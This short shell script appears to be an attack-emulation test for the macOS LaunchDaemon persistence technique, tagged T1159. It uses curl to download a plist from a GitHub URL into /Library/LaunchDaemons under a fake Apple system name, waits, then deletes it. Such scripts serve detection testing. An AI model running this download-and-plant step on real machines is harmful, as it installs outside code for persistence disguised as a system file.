#!/usr/bin/env sh
#ATTACK_PERSISTENCE_T1159_MACOS_FILE_PLIST_LAUNCHDAEMONS
curl https://raw.githubusercontent.com/Pratik-987/Macos/main/com.apple.loginwindow.plist -o /Library/LaunchDaemons/com.apple.loginwindow.plist
sleep 5
rm -rf /Library/LaunchDaemons/com.apple.loginwindow.plist
